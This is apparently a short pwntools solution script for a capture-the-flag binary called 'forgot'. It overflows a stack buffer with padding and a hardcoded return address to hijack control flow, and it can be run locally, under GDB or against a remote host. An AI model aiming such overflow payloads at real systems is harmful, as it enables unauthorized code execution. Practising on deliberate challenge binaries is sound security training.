from pwn import *
from ctypes import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-peda
b* 0x08048849
b* 0x8048a65
b* 0x8048a58
continue
'''.format(**locals())

#Binary filename
exe = './forgot'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

################################################################

p = start()

p.recv()
p.sendline(b"a"*67+p32(0x80486CC))
# p.sendline(b"a"*32 + p32(0x80486CC))
print(p.recv())

p.interactive()        


